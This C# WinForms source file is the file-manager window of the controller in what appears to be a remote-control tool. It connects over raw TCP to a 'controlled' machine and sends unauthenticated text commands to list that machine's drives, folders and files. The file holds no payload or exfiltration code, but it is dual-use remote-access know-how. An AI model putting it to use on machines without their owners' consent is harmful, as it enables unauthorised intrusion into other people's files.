using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
#pragma warning disable 0168
#pragma warning disable 0618
namespace 主控端
{
    public partial class File_Manager : Form
    {
        bool _IsLis2Customer = true;
        public delegate void Pt();
        String LocalDisk_List = "";  //被控端磁盘盘符列表
        String Folder_List = "";     //被控端指定地址文件夹列表
        String File_L = "";          //被控端指定地址文件列表
        Socket Customer_Socket;      //被控端套接字
        Main_Form MF;                //主窗体句柄
        TcpClient Client;            //用于连接被控端
        String Customer_IP;          //被控端IP
        NetworkStream Ns;
        TreeNode Sel_Node;

        public File_Manager(String FTilte , Socket Customer_Socket , Main_Form MF)
        {
            InitializeComponent();
            this.Customer_Socket = Customer_Socket;
            this.MF = MF;
            this.Text = "文件管理 - " + FTilte;
            this.Customer_IP = FTilte;
        }

        /// <summary>
        /// 此方法用于循环监听被控端发送的结果
        /// </summary>
        public void Listen_Socket()
        {
            //一直监听
            while(this._IsLis2Customer)
            {
                try
                {
                    byte[] bb = new byte[1024];
                    using (NetworkStream Ns = new NetworkStream(this.Customer_Socket))
                    {
                        int Res_Len = Ns.Read(bb, 0, bb.Length);
                        //得到被控端发送回来的消息，并且分离成数组结构体
                        String[] Order_Set = Encoding.Default.GetString(bb, 0, Res_Len).Split(new String[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
                        this.Order_Catcher(Order_Set);
                    }
                }
                catch (Exception ex)
                { };
            }
        }

        private void File_Manager_Load(object sender, EventArgs e)
        {
            this.Disk_Dir_Tree.Enabled = false;
            this.File_List.Enabled = false;

            try
            {
                Client = new TcpClient();
                Client.Connect(this.Customer_IP, Globle.ClientPort);
                //如果连接上了
                if (Client.Client.Connected)
                {
                    //重定向SOCKET 得到被控端套接字句柄
                    this.Customer_Socket = this.Client.Client;
                    //窗体加载时默认列举被控端电脑盘符
                    this.Ns = new NetworkStream(this.Customer_Socket);
                    //命令原型 ： $GetDir (没有参数1的情况下返回当前主机所有盘符)
                    this.Ns.Write(Encoding.Default.GetBytes("$GetDir"), 0, Encoding.Default.GetBytes("$GetDir").Length);
                    this.Ns.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("尝试连接被控端发生错误 : " + ex.Message);
            }
            try
            {
                Thread thread = new Thread(new ThreadStart(this.Listen_Socket));
                thread.Start();
            }
            catch (Exception ex)
            { };
        }

        /// <summary>
        /// 此方法用于判断命令结构
        /// 根据不同的命令调用不同的方法进行处理
        /// </summary>
        /// <param name="Order_Set"></param>
        public void Order_Catcher(String[] Order_Set)
        {
            switch (Order_Set[0])
            {
                //硬盘驱动器集合
                case "$GetDir":
                    this.LocalDisk_List = Order_Set[1];
                    this.BeginInvoke(new Pt(this.reFlush_LocalDisk));
                    break;
                //子文件夹集合
                case "$GetFolder":
                    this.Folder_List = Order_Set[1];
                    this.BeginInvoke(new Pt(this.reFlush_Folder));
                    break;
                //子文件集合
                case "$GetFile":
                    this.File_L = Order_Set[1];
                    this.BeginInvoke(new Pt(this.reFlush_File));
                    break;
            }
        }

        /// <summary>
        /// 此方法用于将被控端电脑硬盘盘符列表
        /// 打入树形列表
        /// 调用形式 ：[委托]
        /// </summary>
        public void reFlush_LocalDisk()
        {
            //得到硬盘盘符数组
            String[] LocalDisk_List = this.LocalDisk_List.Split(',');
            this.Disk_Dir_Tree.Nodes.Clear();
            for (int i = 0; i < LocalDisk_List.Length; i++)
            {
                String[] Names = LocalDisk_List[i].Split('#');
                if (Names.Length > 1)
                {
                    this.Disk_Dir_Tree.Nodes.Add(Names[1] + "\\", Names[0] + " " + Names[1], 1);
                    this.Disk_Dir_Tree.Nodes[Names[1] + "\\"].Tag = Names[1] + "\\";
                }
            }
            this.panel1.Visible = false;
            this.Disk_Dir_Tree.Enabled = true;
            this.File_List.Enabled = true;
        }

        /// <summary>
        /// 此方法用于列举被控端电脑指定地址的子文件夹列表
        /// 打入树形列表
        /// 调用形式 ：[委托]
        /// </summary>
        public void reFlush_Folder()
        {
            String[] Folder_List = this.Folder_List.Split(',');
            this.Sel_Node.Nodes.Clear();
            this.File_List.Items.Clear();
            for (int i = 0; i < Folder_List.Length; i++)
            {
                if (Folder_List[i] != "")
                {
                    String Read_Name = Folder_List[i].Substring(Folder_List[i].LastIndexOf("\\") + 1, Folder_List[i].Length - (Folder_List[i].LastIndexOf("\\") + 1));
                    this.Sel_Node.Nodes.Add(Folder_List[i] + "\\", Read_Name, 2);
                    this.Sel_Node.Nodes[Folder_List[i] + "\\"].Tag = Folder_List[i] + "\\";
                    //加入右侧列表
                    this.File_List.Items.Add(Folder_List[i] + "\\", Read_Name, 0);
                }
            }
            this.Sel_Node.Expand();
            this.panel1.Visible = false;
            this.Disk_Dir_Tree.Enabled = true;
            this.File_List.Enabled = true;
        }

        private void Disk_Dir_Tree_NodeMouseDoubleClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            this.Sel_Node = e.Node;
            //发送列目录命令请求
            //原型 : $GetFolder|[参数1]  (列举参数1的目录)
            this.Ns.Write(Encoding.Default.GetBytes("$GetFolder||" + e.Node.Tag), 0, Encoding.Default.GetBytes("$GetFolder||" + e.Node.Tag).Length);
            this.Ns.Flush();
            //发送列文件命令请求
            //原型 : $GetFile|[参数1]  (列举参数1的目录)
            this.Ns.Write(Encoding.Default.GetBytes("$GetFile||" + e.Node.Tag), 0, Encoding.Default.GetBytes("$GetFile||" + e.Node.Tag).Length);
            this.Ns.Flush();
            this.panel1.Visible = true;
            this.Disk_Dir_Tree.Enabled = false;
            this.File_List.Enabled = false;
        }

        /// <summary>
        /// 此方法用于列举被控端电脑指定地址的子文件列表
        /// 打入文件试图列表
        /// 调用形式 ：[委托]
        /// </summary>
        public void reFlush_File()
        {
            //得到分离后的文件数组结构
            String[] File_List = this.File_L.Split(',');
            for (int i = 0; i < File_List.Length; i++)
            {
                if (File_List[i] != "")
                {
                    String Read_Name = File_List[i].Substring(File_List[i].LastIndexOf("\\") + 1, File_List[i].Length - (File_List[i].LastIndexOf("\\") + 1));
                    //打入文件列表
                    this.File_List.Items.Add(File_List[i], Read_Name, 1);
                }
            }
        }

        private void File_Manager_FormClosing(object sender, FormClosingEventArgs e)
        {
            //如果套接字连接中
            try
            {
                if (this.Client.Connected && this.Client != null)
                {
                    //关闭所有连接，并且释放
                    this.Client.Client.Close();
                }
            }
            catch (Exception ex)
            { };
        }
    }
}